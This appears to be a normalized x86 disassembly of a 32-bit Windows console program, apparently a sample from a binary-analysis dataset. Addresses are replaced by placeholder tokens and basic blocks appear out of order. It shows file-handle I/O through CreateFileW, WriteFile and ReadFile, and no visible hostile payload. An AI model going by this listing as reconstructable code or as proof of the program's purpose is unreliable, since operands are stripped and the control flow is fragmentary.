xor ecx ecx
mov [ esp + 0x108 ] cx
push 0x17
mov eax r--data
lea ecx [ esp + 0x10c ]
mov [ esp + 0x120 ] ebx
mov [ esp + 0x11c ] esi
call sub_401c90
lea ecx [ esp + 0x124 ]
mov [ esp + 0x460 ] 0x25
call sub_41a830
lea ecx [ esp + 0xec ]
mov [ esp + 0x460 ] 0x26
call sub_412ff0
xor edx edx
push 0x2
mov eax r--data
lea ecx [ esp + 0x330 ]
mov [ esp + 0x344 ] ebx
mov [ esp + 0x340 ] esi
mov [ esp + 0x330 ] dx
call sub_401c90
mov [ esp + 0x460 ] 0x27
xor eax eax
mov [ esp + 0x348 ] ax
push 0xf
mov eax r--data
lea ecx [ esp + 0x34c ]
mov [ esp + 0x360 ] ebx
mov [ esp + 0x35c ] esi
call sub_401c90
lea ecx [ esp + 0x364 ]
mov [ esp + 0x460 ] 0x28
call sub_42ae30
lea ecx [ esp + 0x32c ]
mov [ esp + 0x460 ] 0x29
call sub_412ff0
xor ecx ecx
mov [ esp + 0x5c ] cx
push 0x6
mov eax r--data
lea ecx [ esp + 0x60 ]
mov [ esp + 0x74 ] ebx
mov [ esp + 0x70 ] esi
call sub_401c90
mov [ esp + 0x460 ] 0x2a
xor edx edx
push 0x54
mov eax r--data
lea ecx [ esp + 0x7c ]
mov [ esp + 0x90 ] ebx
mov [ esp + 0x8c ] esi
mov [ esp + 0x7c ] dx
call sub_401c90
lea ecx [ esp + 0x94 ]
mov [ esp + 0x460 ] 0x2b
call sub_417780
lea ecx [ esp + 0x5c ]
mov [ esp + 0x460 ] 0x2c
call sub_412ff0
lea esi [ esp + 0x5c ]
call sub_411980
lea esi [ esp + 0x32c ]
call sub_411980
lea esi [ esp + 0xec ]
call sub_411980
lea esi [ esp + 0x29c ]
call sub_411980
lea esi [ esp + 0x17c ]
call sub_411980
lea esi [ esp + 0x3bc ]
call sub_411980
lea esi [ esp + 0x20c ]
call sub_411980
lea esi [ esp + 0x14 ]
call sub_411980
lea esi [ esp + 0xa4 ]
call sub_411980
lea esi [ esp + 0x134 ]
call sub_411980
lea esi [ esp + 0x1c4 ]
call sub_411980
lea esi [ esp + 0x254 ]
call sub_411980
lea esi [ esp + 0x2e4 ]
call sub_411980
lea esi [ esp + 0x374 ]
call sub_411980
lea esi [ esp + 0x404 ]
call sub_411980
mov al 0x1
mov ecx [ esp + 0x458 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x440 ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn
sub_411980
push ebp
mov ebp esp
push ecx
mov eax [ esi + 0x38 ]
push ebx
push edi
xor edi edi
cmp eax edi
je r-xdata
mov [ esi + 0x38 ] edi
mov [ esi + 0x3c ] edi
mov [ esi + 0x40 ] edi
cmp [ esi + 0x30 ] 0x8
jb r-xdata
mov ecx [ ebp - 0x4 ]
mov ebx [ esi + 0x3c ]
push ecx
call sub_4133c0
mov edx [ esi + 0x38 ]
push edx
call sub_43811c
add esp 0x8
mov ebx 0x7
xor ecx ecx
mov [ esi + 0x30 ] ebx
mov [ esi + 0x2c ] edi
mov [ esi + 0x1c ] cx
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax [ esi + 0x1c ]
push eax
call sub_43811c
add esp 0x4
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] ebx
xor eax eax
pop edi
mov [ esi ] ax
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ esi ]
push edx
call sub_43811c
add esp 0x4
sub_411a00
push ebp
mov ebp esp
push 0xffffffff
push sub_4545b3
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ecx [ ebp + 0x8 ]
xor ebx ebx
mov [ ecx ] r--data
mov [ ecx + 0x4 ] ebx
mov [ ecx + 0x8 ] ebx
mov [ ecx + 0xc ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ecx + 0x14 ] ebx
call sub_4110b0
push r--data
call [ SetConsoleTitleW@IAT ]
push r--data
push r--data
push 0x20
push r--data
push r--data
push r--data
push rw-data
call sub_409de0
add esp 0x8
push eax
call sub_409de0
add esp 0x8
push eax
call sub_404c10
add esp 0x8
push eax
call sub_40e950
add esp 0x8
push eax
call sub_404c10
add esp 0x8
push eax
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + esi + 0xc ]
xor edi edi
test cl 0x6
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push r--data
push esi
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov edx [ esi ]
mov eax [ edx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push ebx
push eax
call sub_402d50
or eax 0x4
push 0x1c
call sub_438178
add esp 0x4
cmp eax ebx
je r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
mov [ ebp - 0x10 ] ebx
lea esp [ esp ]
mov [ eax + 0x10 ] ebx
xor edx edx
mov ebx eax
mov [ eax + 0x14 ] 0x7
mov [ eax ] dx
mov [ ebp - 0x10 ] ebx
jmp r-xdata
push ebx
push eax
call sub_402d50
or eax 0x4
mov ecx [ rw-data ]
mov ecx [ ecx + 0x4 ]
add ecx rw-data
test esi esi
je r-xdata
mov eax [ eax + rw-data ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0xa
mov ecx rw-data
call sub_408340
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
xor esi esi
test [ eax + rw-data ] 0x6
jne r-xdata
push r--data
push r--data
push rw-data
call sub_409de0
add esp 0x8
push eax
call sub_409de0
add esp 0x8
test eax eax
jne r-xdata
mov eax [ ecx + 0xc ]
or eax esi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov esi 0x4
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
add ecx eax
xor ecx ecx
jmp r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
mov eax [ edi ]
mov edx [ eax + 0x28 ]
push 0xa
mov ecx edi
call edx
movzx eax ax
push eax
push rw-data
mov ecx ebx
call sub_407070
mov ecx [ ebp + 0x8 ]
add esp 0x8
mov edx ebx
call sub_411da0
test al al
jne r-xdata
push 0x0
lea ecx [ ebp - 0x18 ]
mov ebx eax
call sub_436188
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov eax [ ecx + 0x14 ]
and eax 0xfffff3ff
or eax 0x200
mov [ ecx + 0x14 ] eax
mov ecx [ rw-data ]
mov ecx [ ecx + 0x4 ]
lea edx [ ebp - 0x14 ]
add ecx rw-data
push edx
call sub_402e50
push eax
mov [ ebp - 0x4 ] 0x1
call sub_404ad0
mov edi eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x14 ]
add esp 0x4
test eax eax
je r-xdata
test ebx ebx
je r-xdata
mov esi [ ebx + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x18 ]
not esi
call sub_4361b0
and esi ebx
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x14 ] 0x8
jb r-xdata
mov ebx [ ebp - 0x10 ]
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ ebx + 0x4 ] eax
xor ecx ecx
mov [ ebx + 0x14 ] 0x7
mov [ ebx + 0x10 ] 0x0
push ebx
mov [ ebx ] cx
call sub_43811c
add esp 0x4
mov eax [ ebx ]
push eax
call sub_43811c
add esp 0x4
sub_411d10
push ebp
mov ebp esp
push 0xffffffff
push sub_4528fb
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
xor edi edi
mov [ ebp - 0x4 ] edi
call sub_41b850
mov eax [ esi + 0x4 ]
cmp eax edi
je r-xdata
test [ ebp + 0x8 ] 0x1
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ esi + 0x8 ]
push ecx
push edx
call sub_413420
mov eax [ esi + 0x4 ]
push eax
call sub_43811c
add esp 0xc
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call sub_43811c
add esp 0x4
sub_411da0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_454114
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xb8 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xd0 ]
mov [ fs : 0x0 ] eax
xor esi esi
mov ebx edx
cmp [ ebx + 0x10 ] esi
mov edi ecx
sete al
mov [ esp + 0x18 ] edi
test al al
jne r-xdata
mov ecx [ esp + 0xd0 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0xb8 ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x14 ] 0x8
jb r-xdata
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
push 0xffffffff
mov ecx 0x1
lea eax [ esp + 0x5c ]
call sub_406a90
mov ecx eax
mov ebx edi
mov [ esp + 0xd8 ] 0x1
call sub_412740
cmp [ esp + 0x6c ] 0x8
mov bl al
jb r-xdata
cmp eax 0x2a
je r-xdata
movzx eax [ eax ]
cmp eax 0x21
je r-xdata
mov al bl
mov edx [ esp + 0x58 ]
push edx
push 0xffffffff
mov ecx 0x1
lea eax [ esp + 0x78 ]
call sub_406a90
push eax
mov [ esp + 0xdc ] esi
call sub_412a50
cmp [ esp + 0x88 ] 0x8
mov bl al
jb r-xdata
cmp eax 0x40
je r-xdata
mov ecx [ esp + 0x74 ]
push ecx
jmp r-xdata
xor eax eax
push esi
mov [ esp + 0x40 ] ax
push ebx
or eax 0xffffffff
lea edi [ esp + 0x44 ]
mov [ esp + 0x58 ] 0x7
mov [ esp + 0x54 ] esi
call sub_401be0
mov [ esp + 0xd8 ] 0x2
mov [ esp + 0x1c ] esi
mov [ esp + 0x20 ] esi
mov [ esp + 0x24 ] esi
push 0x1
lea ecx [ esp + 0x18 ]
push ecx
mov edx edi
mov [ esp + 0xe0 ] 0x3
push edx
mov [ esp + 0x20 ] 0x20
call sub_4130f0
mov [ esp + 0x14 ] eax
cmp eax 0xffffffff
je r-xdata
call sub_43811c
add esp 0x4
mov eax [ esp + 0x18 ]
push eax
lea ecx [ esp + 0x20 ]
lea edx [ esp + 0x40 ]
call sub_411fd0
lea esi [ esp + 0x1c ]
mov bl al
call sub_406ac0
lea esi [ esp + 0x3c ]
call sub_4218d0
jmp r-xdata
push eax
xor ecx ecx
lea eax [ esp + 0x94 ]
mov edx edi
call sub_406a90
mov edi eax
lea esi [ esp + 0x3c ]
mov [ esp + 0xd8 ] 0x4
call sub_4023e0
lea esi [ esp + 0x90 ]
mov [ esp + 0xd8 ] 0x3
call sub_4218d0
mov ecx [ esp + 0x14 ]
push 0xffffffff
inc ecx
lea eax [ esp + 0xb0 ]
mov edx ebx
call sub_406a90
mov ecx eax
lea edx [ esp + 0x2c ]
mov [ esp + 0xd8 ] 0x5
call sub_4067d0
mov ebx eax
lea esi [ esp + 0x1c ]
mov [ esp + 0xd8 ] 0x6
call sub_4130a0
lea esi [ esp + 0x2c ]
call sub_406ac0
lea esi [ esp + 0xac ]
mov [ esp + 0xd8 ] 0x3
call sub_4218d0
sub_411fd0
push ebp
mov ebp esp
push 0xffffffff
push sub_4528c0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x68
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
push 0x2
mov ebx edx
push r--data
push ebx
mov [ ebp - 0x6c ] eax
mov [ ebp - 0x70 ] ecx
call sub_4130f0
mov esi eax
xor edi edi
xor edx edx
push edi
mov eax r--data
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x68 ] esi
mov [ ebp - 0x34 ] 0x7
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x48 ] dx
call sub_401c90
mov [ ebp - 0x4 ] edi
xor eax eax
push edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x2c ] ax
push ebx
or eax 0xffffffff
lea edi [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0x7
call sub_401be0
mov [ ebp - 0x4 ] 0x1
cmp esi 0xffffffff
je r-xdata
mov eax [ ebp - 0x6c ]
mov edi [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x68 ] edi
mov [ ebp - 0x68 ] eax
cmp edi eax
je r-xdata
mov ecx esi
push ecx
xor ecx ecx
lea eax [ ebp - 0x64 ]
mov edx ebx
call sub_406a90
mov edi eax
lea esi [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x2
call sub_4023e0
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x50 ] 0x8
jb r-xdata
push r--data
push ecx
lea edx [ ebp - 0x48 ]
push edx
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0xc
push eax
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov ebx [ ebp - 0x38 ]
mov ecx [ ebp - 0x68 ]
push 0xffffffff
add ecx 0x2
lea eax [ ebp - 0x64 ]
mov edx ebx
call sub_406a90
mov edi eax
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x3
call sub_4023e0
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x50 ] 0x8
jb r-xdata
mov edx [ ebp - 0x64 ]
push edx
call sub_43811c
add esp 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_43811c
add esp 0x4
push 0xa
mov ecx esi
call sub_408340
mov edx [ esi ]
mov eax [ edx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
cmp [ ebp - 0x34 ] ecx
mov ecx [ ebp - 0x48 ]
jae r-xdata
mov edx esi
mov edx ebx
cmp ebx esi
jb r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
test edx edx
je r-xdata
lea ecx [ ebp - 0x48 ]
push r--data
push esi
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov edx [ esi ]
mov eax [ edx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
cmp ebx esi
jb r-xdata
lea ebx [ ebx ]
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
add edi 0x48
cmp edi [ ebp - 0x68 ]
jne r-xdata
xor eax eax
cmp ebx esi
setne al
mov cx bx
cmp cx [ eax ]
sbb eax eax
and eax 0xfffffffe
inc eax
je r-xdata
add ecx 0x2
add eax 0x2
dec edx
jne r-xdata
mov edx [ ebp - 0x6c ]
push edx
call sub_412d90
mov esi 0x8
cmp [ ebp - 0x18 ] esi
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov esi [ edi + 0x10 ]
mov ecx 0x8
cmp [ edi + 0x14 ] ecx
jb r-xdata
mov [ ebp - 0x68 ] edi
mov eax [ edi + 0x3c ]
mov esi [ edi + 0x38 ]
mov [ ebp - 0x68 ] edi
mov [ ebp - 0x6c ] eax
cmp esi eax
je r-xdata
mov ebx [ ebp - 0x38 ]
mov ebx [ ebp - 0x38 ]
jmp r-xdata
mov bx [ ecx ]
cmp bx [ eax ]
jne r-xdata
xor ecx ecx
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] cx
cmp [ ebp - 0x34 ] esi
jb r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_43811c
add esp 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
lea edx [ ebp - 0x2c ]
test ebx ebx
jne r-xdata
mov ebx [ ebp - 0x1c ]
test eax eax
je r-xdata
mov al 0x1
mov edx [ ebp - 0x48 ]
push edx
push r--data
push ecx
push edx
push ecx
push r--data
push ecx
lea eax [ ebp - 0x48 ]
push eax
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0xc
push eax
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0xc
push eax
call sub_409de0
add esp 0x8
mov edi eax
push 0xa
mov ecx edi
call sub_408340
mov ecx [ edi ]
mov eax [ ecx + 0x4 ]
push r--data
push ecx
push edx
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0xc
push eax
call sub_409de0
add esp 0x8
mov edi eax
push 0xa
mov ecx edi
call sub_408340
mov eax [ edi ]
mov eax [ eax + 0x4 ]
jmp r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
mov ecx [ edi ]
mov ecx [ ecx + 0x4 ]
add ecx edi
test esi esi
je r-xdata
mov eax [ eax + edi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
xor esi esi
test [ eax + edi + 0xc ] 0x6
jne r-xdata
cmp [ ebp - 0x18 ] ecx
mov ecx [ ebp - 0x2c ]
jae r-xdata
mov edx edi
mov edx ebx
cmp ebx edi
jb r-xdata
push 0xa
mov ecx rw-data
call sub_408340
mov edx [ rw-data ]
mov eax [ edx + 0x4 ]
xor esi esi
test [ eax + rw-data ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax esi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov esi 0x4
test edx edx
je r-xdata
lea ecx [ ebp - 0x2c ]
mov ecx [ rw-data ]
mov ecx [ ecx + 0x4 ]
add ecx rw-data
test esi esi
je r-xdata
mov eax [ eax + rw-data ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
cmp ebx edi
jb r-xdata
mov bx [ ecx ]
cmp bx [ eax ]
jne r-xdata
mov ebx [ ebp - 0x68 ]
lea edx [ ebx + 0x1c ]
push edx
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov edi eax
push 0xa
mov ecx edi
call sub_408340
mov eax [ edi ]
mov eax [ eax + 0x4 ]
xor esi esi
test [ eax + edi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax esi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov esi 0x4
add esi 0x3c
cmp esi [ ebp - 0x6c ]
jne r-xdata
xor eax eax
cmp ebx edi
setne al
sbb eax eax
and eax 0xfffffffe
inc eax
je r-xdata
add ecx 0x2
add eax 0x2
dec edx
jne r-xdata
mov ecx [ edi ]
mov ecx [ ecx + 0x4 ]
add ecx edi
test esi esi
je r-xdata
mov eax [ eax + edi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
mov edi [ esi + 0x14 ]
mov ecx 0x8
cmp [ esi + 0x18 ] ecx
jb r-xdata
mov ebx [ ebp - 0x38 ]
mov eax [ ebp - 0x70 ]
mov ecx [ esi ]
push eax
call ecx
mov esi 0x8
add esp 0x4
mov bl al
cmp [ ebp - 0x18 ] esi
jb r-xdata
mov ebx [ ebp - 0x1c ]
mov ebx [ ebp - 0x1c ]
jmp r-xdata
push ebx
call sub_412e90
mov esi 0x8
cmp [ ebp - 0x18 ] esi
jb r-xdata
mov eax [ ecx + 0xc ]
or eax esi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov esi 0x4
xor eax eax
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] ax
cmp [ ebp - 0x34 ] esi
jb r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_43811c
add esp 0x4
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] ax
cmp [ ebp - 0x34 ] esi
jb r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_43811c
add esp 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
mov al bl
jmp r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_43811c
add esp 0x4
mov ecx [ ebp - 0x48 ]
push ecx
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn 0x4
call sub_43811c
add esp 0x4
sub_4125c0
push ebp
mov ebp esp
push 0xffffffff
push sub_453948
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
push r--data
push rw-data
call sub_409de0
add esp 0x8
push 0x0
push 0x0
push 0x3
push 0x0
push 0x0
push 0xc0000000
push r--data
call [ CreateFileW@IAT ]
mov [ esi + 0x14 ] eax
test eax eax
je r-xdata
cmp eax 0xffffffff
je r-xdata
push 0x0
lea eax [ ebp - 0x2c ]
push 0x1
push eax
mov [ ebp - 0x2d ] 0x0
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ ebp - 0x4 ] 0x0
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
cmp eax 0xffffffff
je r-xdata
mov al 0x1
jmp r-xdata
xor edx edx
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] dx
mov ecx [ ebp - 0x2c ]
push ecx
call sub_43811c
add esp 0x4
push r--data
push rw-data
mov [ ebp - 0x2d ] 0x1
call sub_409de0
add esp 0x8
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov ecx [ rw-data ]
mov ecx [ ecx + 0x4 ]
add ecx rw-data
test esi esi
je r-xdata
mov eax [ eax + rw-data ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0xa
mov ecx rw-data
call sub_408340
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
xor esi esi
test [ eax + rw-data ] 0x6
jne r-xdata
mov al [ ebp - 0x2d ]
mov eax [ ecx + 0xc ]
or eax esi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov esi 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
sub_412740
push ebp
mov ebp esp
push 0xffffffff
push sub_4540a0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x48
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
xor edi edi
cmp [ esi + 0x10 ] edi
je r-xdata
push r--data
push rw-data
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov ecx ebx
call sub_4125c0
test al al
je r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push r--data
push rw-data
call sub_409de0
add esp 0x8
jmp r-xdata
cmp [ esi + 0x14 ] 0x8
mov eax [ esi + 0x10 ]
jb r-xdata
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov al 0x1
push edi
lea ecx [ ebp - 0x54 ]
push ecx
lea edx [ eax + eax + 0x2 ]
mov eax [ ebx + 0x14 ]
push edx
push esi
push eax
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov esi [ esi ]
cmp eax 0xffffffff
je r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
push edi
lea eax [ ebp - 0x2c ]
push 0x1
push eax
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ ebp - 0x4 ] 0x1
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
test [ eax + esi + 0xc ] 0x6
jne r-xdata
push 0x40000
mov [ ebp - 0x50 ] edi
call sub_435b34
add esp 0x4
push 0x40000
mov esi eax
push edi
push esi
mov [ ebp - 0x4c ] esi
call sub_43a820
mov edx [ ebx + 0x14 ]
add esp 0xc
push edi
lea ecx [ ebp - 0x50 ]
push ecx
push 0x40000
push esi
push edx
call [ ReadFile@IAT ]
test eax eax
je r-xdata
push eax
call [ CloseHandle@IAT ]
test eax eax
mov al 0x1
je r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push edi
lea edx [ ebp - 0x48 ]
push 0x1
push edx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ ebp - 0x4 ] edi
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
test [ eax + esi + 0xc ] 0x6
jne r-xdata
push esi
push rw-data
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov [ ebx + 0x14 ] 0x0
jmp r-xdata
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
